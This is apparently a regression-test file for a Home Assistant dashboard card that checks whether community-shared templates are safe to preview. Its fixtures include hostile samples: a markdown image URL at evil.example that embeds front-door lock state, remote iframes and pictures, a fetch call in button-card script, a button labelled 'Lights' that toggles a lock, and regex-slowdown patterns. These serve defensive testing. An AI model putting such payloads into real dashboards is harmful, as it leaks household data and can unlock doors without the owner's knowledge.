/*
 * Regression tests for the sharing, gallery, health and registry review (2026-11-27): each
 * block is one finding, named for what went wrong. Run with `npm test`.
 */
const { check } = require('./check');
const {
  parseDiscussion,
  communityRisks,
  communityNeeds,
  fetchCommunity,
  inertPost,
  withoutImages,
} = require('../.test-build/community.js');
const { unmetRequirements, versionAtLeast } = require('../.test-build/sharing.js');
const { buildExport } = require('../.test-build/share.js');
const { globMatches } = require('../.test-build/registry.js');

const yamlPost = (number, yaml, extra = {}) => ({
  number,
  title: `Post ${number}`,
  body: '```yaml\n' + yaml + '\n```',
  html_url: `https://github.com/x/y/discussions/${number}`,
  user: { login: 'someone' },
  updated_at: '2026-10-01T00:00:00Z',
  ...extra,
});

const entryOf = (card, extra = {}) => ({ name: 't', template: { card, ...extra }, includes: {} });

/* --- a post is only drawn live when nothing in it can fetch, run or press --- */

check('a plain tile is inert', inertPost(entryOf({ type: 'tile', entity: '[[entity]]' })), true);
check(
  'a plain entities card is inert',
  inertPost(entryOf({ type: 'entities', entities: ['light.kitchen', 'sensor.hall_temperature'] })),
  true,
);
check(
  'a markdown card whose image address is Jinja is not',
  inertPost(
    entryOf({ type: 'markdown', content: "![x](https://evil.example/p.png?s={{ states('lock.front_door') }})" }),
  ),
  false,
);
check(
  'Jinja alone is not, address or no address',
  inertPost(entryOf({ type: 'markdown', content: "{{ states('lock.front_door') }}" })),
  false,
);
check(
  'button-card JavaScript is not',
  inertPost(entryOf({ type: 'custom:button-card', name: "[[[ return fetch('x') ]]]" })),
  false,
);
check('a custom card is not, script or no script', inertPost(entryOf({ type: 'custom:mushroom-entity-card' })), false);
check('an iframe is not', inertPost(entryOf({ type: 'iframe', url: 'https://evil.example/' })), false);
check(
  'a picture from somewhere else is not',
  inertPost(entryOf({ type: 'picture', image: 'https://evil.example/p.png' })),
  false,
);
check(
  'nor is one whose address has no scheme',
  inertPost(entryOf({ type: 'picture', image: 'evil.example/p.png' })),
  false,
);
check('a picture of its own Home Assistant is', inertPost(entryOf({ type: 'picture', image: '/local/p.png' })), true);
check(
  'a press that calls a service is not',
  inertPost(
    entryOf({
      type: 'tile',
      entity: 'light.x',
      tap_action: { action: 'perform-action', perform_action: 'lock.unlock' },
    }),
  ),
  false,
);
check(
  'a custom card in a template the post carries is not',
  inertPost({
    name: 't',
    template: { card: { type: 'tile' } },
    includes: { other: { card: { type: 'custom:x-card' } } },
  }),
  false,
);
check(
  'what is drawn is checked too: Jinja put together from two defaults is not inert',
  inertPost(entryOf({ type: 'markdown', content: '[[a]][[b]]' }), { type: 'markdown', content: '{{ states() }}' }),
  false,
);
check('a card type spelt by a placeholder is not', inertPost(entryOf({ type: '[[kind]]', entity: 'light.x' })), false);

/* --- a button toggles when it is not told what to do --- */

check(
  'a button on a lock with no tap action is a toggle of the lock',
  communityRisks(entryOf({ type: 'button', entity: 'lock.front_door', name: 'Lights' })).actions,
  ['toggle lock.front_door'],
);
check(
  'a button on a light is what a button is for',
  communityRisks(entryOf({ type: 'button', entity: 'light.kitchen' })).actions,
  [],
);
check(
  'a button told to do something else is read by what it was told',
  communityRisks(entryOf({ type: 'button', entity: 'lock.front_door', tap_action: { action: 'more-info' } })).actions,
  [],
);
check(
  'a button whose lock comes from its own defaults is found as well',
  communityRisks(entryOf({ type: 'button', entity: '[[e]]' }, { default: [{ e: 'cover.garage' }] })).actions,
  ['toggle cover.garage'],
);
check(
  'a button filled from a registry sweep reaches what the sweep reaches',
  communityRisks({
    name: 'outer',
    template: {
      card: { type: 'custom:decluttering-card-plus', template: 'inner', for_each_from: { domain: 'lock' } },
    },
    includes: { inner: { card: { type: 'button', entity: '[[entity]]' } } },
  }).actions,
  ['toggle lock.*'],
);

/* --- a readme is drawn as Markdown, so what it would fetch is said and a post's pictures go --- */

check(
  'the address of a picture in a readme is listed',
  communityRisks(entryOf({ type: 'tile' }, { readme: 'See ![x](https://evil.example/t.png)' })).urls,
  ['https://evil.example/t.png'],
);
check(
  'a link in a readme with no picture is still only a link',
  communityRisks(entryOf({ type: 'tile' }, { readme: 'See https://example.com/readme' })).urls,
  [],
);
check(
  'prose about Jinja in a readme is not a script',
  communityRisks(entryOf({ type: 'tile' }, { readme: 'Uses {{ states() }} inside.' })).scripts,
  false,
);
check(
  'a Markdown picture becomes a link',
  withoutImages('a ![x](https://e.example/t.png) b'),
  'a [x](https://e.example/t.png) b',
);
check('however many marks it has', withoutImages('!![x](u)'), '[x](u)');
check('an img tag goes', withoutImages('a <img src="https://e.example/t.png"> b'), 'a  b');
check('one hidden inside another goes with it', withoutImages('<im<img>g src=x>'), '');
check('video, audio and their sources go', withoutImages('<video poster=x><source src=y></video><audio src=z>'), '');
check(
  'ordinary text is left alone',
  withoutImages('Wow! [a link](https://e.example) <b>bold</b>'),
  'Wow! [a link](https://e.example) <b>bold</b>',
);
check(
  'a post is read with its readme pictures taken out',
  parseDiscussion(yamlPost(1, 'template: t\nreadme: "![x](https://e.example/t.png)"\ncard:\n  type: tile')).template
    .readme,
  '[x](https://e.example/t.png)',
);

/* --- a required entity pattern is matched in linear time --- */

{
  const here = {
    components: [],
    entities: ['sensor.living_room_temperature_battery_level'],
    card: '3.4.0',
    isDefined: () => true,
  };
  const started = Date.now();
  const unmet = unmetRequirements([{ requires: { entities: ['*'.repeat(60) + '!'] } }], here);
  check('a pattern of nothing but stars is answered at once', [unmet.length, Date.now() - started < 1000], [1, true]);
  check(
    'a pattern still matches, whatever its case',
    unmetRequirements([{ requires: { entities: ['Sensor.*_battery_*'] } }], here).length,
    0,
  );
  check(
    'and is still matched in full',
    unmetRequirements([{ requires: { entities: ['sensor.living'] } }], here).length,
    1,
  );
}

check('a version written with a v is still a version', versionAtLeast('3.4.0', 'v9.0'), false);
check('and is met when it is', versionAtLeast('3.4.0', 'v3.4'), true);

/* --- names: a title, a template called constructor --- */

{
  const long = parseDiscussion(yamlPost(2, `template: ${'a'.repeat(5000)}\ncard:\n  type: tile`, { title: '⠀' }));
  check('a post whose template name is no name is not listed', long, undefined);
  const named = parseDiscussion(yamlPost(3, `template: ${'a'.repeat(95)}\ncard:\n  type: tile`, { title: '⠀' }));
  check('a title taken from the name is cut like any title', named.title.length, 80);
}
check(
  'a template called constructor is needed like any other',
  communityNeeds(entryOf({ type: 'custom:decluttering-card-plus', template: 'constructor' }), []).templates,
  ['constructor'],
);

/* --- a picked template name is matched without a regular expression --- */

{
  const picked = '[[a]]'.repeat(40) + '!';
  const config = { template: 'me', card: { type: 'custom:decluttering-card-plus', template: picked } };
  const started = Date.now();
  buildExport(config, { me: config, living_room_temperature_battery_tile: { card: { type: 'tile' } } });
  check('forty placeholders in a name are answered at once', Date.now() - started < 1000, true);

  const chooser = { template: 'me', card: { type: 'custom:decluttering-card-plus', template: '[[kind]]_tile' } };
  const out = buildExport(chooser, {
    me: chooser,
    light_tile: { card: { type: 'tile' } },
    Light_Tile: { card: { type: 'tile' } },
    light_row: { row: { entity: 'x' } },
  });
  check('the templates a picked name fits still go along', Object.keys(out.payload.includes), ['light_tile']);

  const proto = { template: 'me', card: { type: 'custom:decluttering-card-plus', template: 'constructor' } };
  check(
    'a template called constructor that is not there is said to be missing',
    buildExport(proto, { me: proto }).notes.length,
    1,
  );
  const there = buildExport(proto, { me: proto, constructor: { card: { type: 'tile' } } });
  check('and goes along when it is', Object.keys(there.payload.includes ?? {}), ['constructor']);
}
check('a glob can be told to mind its case', [globMatches('Ab', 'a*', true), globMatches('Ab', 'a*')], [false, true]);

/* --- fetching the list --- */

const memoryStorage = (initial) => {
  const data = { ...initial };
  return {
    getItem: (key) => (key in data ? data[key] : null),
    setItem: (key, value) => {
      data[key] = String(value);
    },
  };
};
const respond = (status, body, headers = {}) => ({
  ok: status >= 200 && status < 300,
  status,
  headers: { get: (name) => headers[name.toLowerCase()] ?? null },
  json: async () => body,
});

(async () => {
  let calls = 0;
  const stale = memoryStorage({
    'decluttering-card-plus-community': JSON.stringify({ entries: [], fetched: 10_000_000_000 }),
  });
  await fetchCommunity({
    storage: stale,
    now: 1000,
    fetcher: async () => {
      calls += 1;
      return respond(200, []);
    },
  });
  check('a cache stamped in the future is not believed', calls, 1);

  let limited;
  try {
    await fetchCommunity({
      refresh: true,
      storage: memoryStorage(),
      now: 3000,
      fetcher: async () => respond(429, {}, { 'retry-after': '60' }),
    });
  } catch (err) {
    limited = err;
  }
  check('a secondary rate limit says when to try again too', limited && limited.retryAt, 63000);

  let stalled;
  const began = Date.now();
  try {
    await fetchCommunity({
      storage: memoryStorage(),
      timeout: 20,
      fetcher: (_url, init) =>
        new Promise((_resolve, reject) => {
          init.signal.addEventListener('abort', () => reject(new Error('aborted')));
        }),
    });
  } catch (err) {
    stalled = err;
  }
  check(
    'a request GitHub never answers is given up on',
    [!!stalled, Date.now() - began < 5000, /answer/.test(stalled ? stalled.message : '')],
    [true, true, true],
  );

  // A browser with storage switched off throws on the very mention of it.
  const descriptor = Object.getOwnPropertyDescriptor(globalThis, 'localStorage');
  Object.defineProperty(globalThis, 'localStorage', {
    configurable: true,
    get() {
      throw new Error('The operation is insecure.');
    },
  });
  let blocked;
  try {
    blocked = await fetchCommunity({ fetcher: async () => respond(200, []) });
  } catch (err) {
    blocked = err;
  } finally {
    if (descriptor) Object.defineProperty(globalThis, 'localStorage', descriptor);
    else delete globalThis.localStorage;
  }
  check('storage that cannot be touched only costs the cache', blocked && Array.isArray(blocked.entries), true);
})();

/* --- the gallery --- */

{
  const {
    galleryEntries,
    galleryTemplates,
    thumbnailConfig,
    thumbnailHass,
    thumbnailStamp,
    sampleVariables,
  } = require('../.test-build/gallery.js');
  const { libraryNeeds } = require('../.test-build/library.js');

  const shared = (id, card, includes = {}) => ({
    id,
    title: `Post ${id}`,
    author: 'someone',
    url: `https://github.com/x/y/discussions/${id}`,
    name: `post_${id}`,
    template: { card },
    includes,
    reactions: 0,
    updated: '2026-10-01T00:00:00Z',
  });
  const hostile = shared(1, {
    type: 'vertical-stack',
    cards: [{ type: 'markdown', content: "![x](https://evil.example/p.png?s={{ states('lock.front_door') }})" }],
  });
  const plain = shared(2, { type: 'tile', entity: 'light.kitchen_ceiling' });
  const script = shared(3, { type: 'custom:button-card', name: '[[[ return 1 ]]]' });
  const nested = shared(
    4,
    { type: 'custom:decluttering-card-plus', template: 'inner' },
    { inner: { card: { type: 'tile' } } },
  );
  const entries = galleryEntries(
    {
      library: [],
      community: [hostile, plain, script, nested],
      installed: {
        mine: {
          card: { type: 'custom:button-card', name: '[[[ return 1 ]]]' },
          source: { discussion: 3, author: 'ann' },
        },
      },
    },
    () => '',
  );
  const drawn = (index) => thumbnailConfig(entries[index], galleryTemplates(entries));
  check('a shared post that renders Jinja into an address is not drawn', drawn(0), undefined);
  check('a shared post that is a plain tile is', drawn(1), { type: 'tile', entity: 'light.kitchen_ceiling' });
  check('a shared post with a custom card is not drawn', drawn(2), undefined);
  check('nor one that calls a template, which is a custom card too', drawn(3), undefined);
  check('an installed template is drawn whatever it holds: it was agreed to', drawn(4).type, 'custom:button-card');
  check('a tile lists the custom cards it needs, not this card itself', entries[3].customCards, []);
  check("and still lists other people's", entries[2].customCards, ['custom:button-card']);
  check('an installed tile carries no address nobody wrote', 'url' in entries[4], false);

  const page = { states: { 'light.real': {} } };
  check(
    'one page hass makes one thumbnail hass',
    [thumbnailHass(page) === thumbnailHass(page), thumbnailHass(page) === thumbnailHass({ ...page })],
    [true, false],
  );
  check(
    'and the sample registries are the same objects whichever page hass it was',
    ['entities', 'devices', 'areas', 'floors'].every(
      (key) => thumbnailHass(page)[key] === thumbnailHass({ ...page })[key],
    ),
    true,
  );

  const edited = { ...entries[1], template: { card: { type: 'tile', entity: 'lock.front_door' } } };
  check(
    'a tile whose template changed under the same key is told apart',
    [entries[1].key === edited.key, thumbnailStamp(entries[1]) === thumbnailStamp(edited)],
    [true, false],
  );
  check('and one that did not is not', thumbnailStamp(entries[1]), thumbnailStamp({ ...entries[1] }));

  check(
    'a variable called toString is not given a function to stand in for it',
    sampleVariables(
      { variables: [{ name: 'toString' }], card: { type: 'markdown', content: '[[toString]] [[constructor]]' } },
      {
        content: '[[toString]] [[constructor]]',
      },
    ),
    [{ toString: '' }],
  );
  check(
    "a template called constructor is found among the gallery's",
    galleryTemplates([{ name: 'constructor', template: { card: { type: 'tile' } }, includes: {} }]).constructor,
    { card: { type: 'tile' } },
  );
  check(
    'a card of some other name with decluttering-card in it is not this card',
    libraryNeeds(
      { name: 'x', summary: '', template: { card: { type: 'custom:my-decluttering-card-fork', template: 'y' } } },
      [],
    ),
    [],
  );
}

/* --- dashboard health --- */

{
  const { healthEntries, dashboardToCheck } = require('../.test-build/health-card-pure.js');
  const { checkDashboard, collectTemplates } = require('../.test-build/templates.js');

  const CARD = 'custom:decluttering-card-plus';
  const picked = {
    decluttering_templates: { light_tile: { card: { type: 'tile' } } },
    views: [
      {
        title: 'v',
        strategy: {
          type: CARD,
          sections: [
            {
              for_each: [{ kind: 'light' }],
              section: { type: 'grid', cards: [{ type: CARD, template: '[[kind]]_tile' }] },
            },
          ],
        },
      },
    ],
  };
  check(
    'a template name picked by a placeholder is a card, and not a missing one',
    healthEntries(picked, collectTemplates(picked), 'd').counts,
    { missing: 0, unset: 0, deprecated: 0, fine: 1, cards: 1 },
  );
  check('the panel does not call it missing either', checkDashboard(picked, []).missingTemplates, []);
  check(
    'a name that is simply not there still is',
    checkDashboard({ views: [{ cards: [{ type: CARD, template: 'nope' }] }] }, []).missingTemplates,
    [{ template: 'nope', count: 1 }],
  );

  const written = {
    strategy: {
      type: CARD,
      decluttering_templates: { room: { variables: ['area'], card: { type: 'tile', name: '[[area]]' } } },
      views: [
        { title: 'Home', cards: [{ type: CARD, template: 'nope' }] },
        { for_each_from: { areas: true }, view: { title: '[[area]]', cards: [{ type: CARD, template: 'room' }] } },
      ],
    },
  };
  const root = dashboardToCheck(written);
  check('a dashboard written by the strategy is read as what the strategy says', root === written.strategy, true);
  check(
    'so its cards are counted, and a repeated view hands its values down',
    healthEntries(root, collectTemplates(root), 'd').counts,
    { missing: 1, unset: 0, deprecated: 0, fine: 1, cards: 2 },
  );
  const ordinary = { views: [] };
  check('an ordinary dashboard is read as it is', dashboardToCheck(ordinary) === ordinary, true);
  const other = { strategy: { type: 'original-states' } };
  check("and so is somebody else's strategy", dashboardToCheck(other) === other, true);
}

/* --- a template's version is dotted numbers, not a fraction --- */

{
  const { olderElsewhere, templateVersion, changeNotes, compareVersions } = require('../.test-build/version-check.js');
  check(
    'a lender at 1.10 is not older than a copy at 1.9',
    olderElsewhere({ a: { version: '1.9' } }, { a: { version: '1.10' } }, { a: 'lib' }),
    [],
  );
  check(
    'and a lender at 1.9 is older than a copy at 1.10',
    olderElsewhere({ a: { version: '1.10' } }, { a: { version: '1.9' } }, { a: 'lib' }),
    [{ template: 'a', here: '1.10', there: 1.9, dashboard: 'lib' }],
  );
  check(
    'three parts are compared too',
    olderElsewhere({ a: { version: '1.2.10' } }, { a: { version: '1.2.9' } }, { a: 'lib' }).length,
    1,
  );
  check(
    'no version written is no version, not nought',
    [templateVersion({ version: '' }), templateVersion({ version: ' ' })],
    [undefined, undefined],
  );
  check('words are no version', templateVersion({ version: 'latest' }), undefined);
  check('change notes are ordered the same way', changeNotes({ changes: { 1.9: 'a', '1.10': 'b' } }), [
    { version: '1.10', note: 'b' },
    { version: 1.9, note: 'a' },
  ]);
  check('equal is equal, however long it is written', compareVersions('2.0', 2), 0);
}

/* --- the label registry: a refused subscription, a rename mid-fetch, a fetch that fails --- */

(async () => {
  const { loadLabels, labelName, resetLabels } = require('../.test-build/labels.js');
  const unhandled = [];
  const note = (err) => unhandled.push(err && err.message);
  process.on('unhandledRejection', note);

  resetLabels();
  let onEvent;
  const pending = [];
  const hass = {
    callWS: () => new Promise((resolve) => pending.push(resolve)),
    connection: {
      subscribeEvents: (callback) => {
        onEvent = callback;
        return Promise.reject(new Error('Unauthorized'));
      },
    },
  };
  const first = loadLabels(hass);
  onEvent();
  pending[0]([{ label_id: 'a', name: 'Old name' }]);
  await new Promise((resolve) => setTimeout(resolve, 5));
  if (pending[1]) pending[1]([{ label_id: 'a', name: 'New name' }]);
  await first;
  await new Promise((resolve) => setTimeout(resolve, 5));
  process.off('unhandledRejection', note);
  check('a subscription that is refused is not left unhandled', unhandled, []);
  check(
    'an answer from before a rename is asked for again, not kept',
    [pending.length, labelName(hass, 'a')],
    [2, 'New name'],
  );

  resetLabels();
  let calls = 0;
  const failing = {
    callWS: async () => {
      calls += 1;
      throw new Error('nope');
    },
  };
  await loadLabels(failing);
  await loadLabels(failing);
  await loadLabels(failing);
  check('a fetch that failed is not tried again on every call', calls, 1);
  await loadLabels(failing, Date.now() + 60_000);
  check('and is tried again once it has had a rest', calls, 2);
  resetLabels();
})();

/* --- a written-out view is written again when a label is renamed --- */

{
  const { strategyStale } = require('../.test-build/strategy.js');
  const entities = {};
  const hass = { entities, devices: {}, areas: {}, floors: {} };
  const same = { ...hass, states: { 'light.x': {} } };
  const labels = { a: { label_id: 'a', name: 'Old' } };
  check('a state change alone is nothing to write again for', strategyStale(undefined, hass, same, {}), false);
  check('a registry replaced on hass is', strategyStale(undefined, hass, { ...hass, entities: {} }, {}), true);
  check(
    'a label registry that is still the one read is not',
    strategyStale({ labels }, hass, same, { labels, categories: {} }),
    false,
  );
  check(
    'one that has been dropped or fetched again is',
    strategyStale({ labels }, hass, same, { labels: undefined }),
    true,
  );
  check(
    'a strategy that read no labels does not mind what they do',
    strategyStale({ categories: undefined }, hass, same, { labels: {}, categories: undefined }),
    false,
  );
  check('categories count the same way', strategyStale({ categories: {} }, hass, same, { categories: {} }), true);
}

/* --- waiting for ha-markdown: one wait, one call back per element --- */

(async () => {
  let waits = 0;
  let defined;
  const previous = globalThis.customElements;
  globalThis.customElements = {
    get: () => undefined,
    whenDefined: () => {
      waits += 1;
      return new Promise((resolve) => (defined = resolve));
    },
  };
  // The registry is read when it is asked, not when the module loads.
  const { markdownReady } = require('../.test-build/shared.js');
  const element = {};
  let called = 0;
  let other = 0;
  for (let render = 0; render < 5; render += 1) markdownReady(() => (called += 1), element);
  markdownReady(() => (other += 1), {});
  check('however often it is asked, it waits once', waits, 1);
  defined();
  await new Promise((resolve) => setTimeout(resolve, 5));
  check('and calls each element back once', [called, other], [1, 1]);
  if (previous === undefined) delete globalThis.customElements;
  else globalThis.customElements = previous;
})();
